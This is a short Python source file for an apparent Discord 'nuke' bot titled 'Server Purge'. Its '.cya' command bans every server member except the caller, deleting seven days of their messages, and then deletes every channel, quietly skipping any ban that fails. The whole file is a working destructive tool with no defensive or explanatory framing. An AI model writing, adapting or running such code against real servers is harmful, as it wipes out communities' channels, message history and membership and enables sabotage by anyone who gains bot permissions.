import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")
token = ""


@client.event
async def on_ready():
    print("-------")
    print("Logged in as:")
    print("User: " + client.user.name + "#" + client.user.discriminator)
    print("ID: " + client.user.id)
    print("Server Purge")
    print("-------")


@client.command(pass_context=True)
async def cya(ctx):

    server = ctx.message.server
    author = ctx.message.author

    #  banning everyone

    print("[CYA] Ban started.")
    for member in list(server.members):
        if member == author:
            print("[CYA] Not banning [{}]".format(author))  # makes the bot not ban whoever uses command
        else:
            print("[CYA] Banning member [{}]".format(member))

            # in-case you cant ban someone due to perms, roles, etc.
            try:
                await client.ban(member, delete_message_days=7)
            except:
                pass
    print("[CYA] Done banning.")

    #  deleting channels

    print("[CYA] Mass deletion started.")
    for channel in list(server.channels):
        print("[CYA] Deleting {} channel [{}]".format(channel.type, channel.name))
        await client.delete_channel(channel)

    print("[CYA] Done deleting.")

    print("[CYA] Finished [CYA] protocol.")

client.run(token)
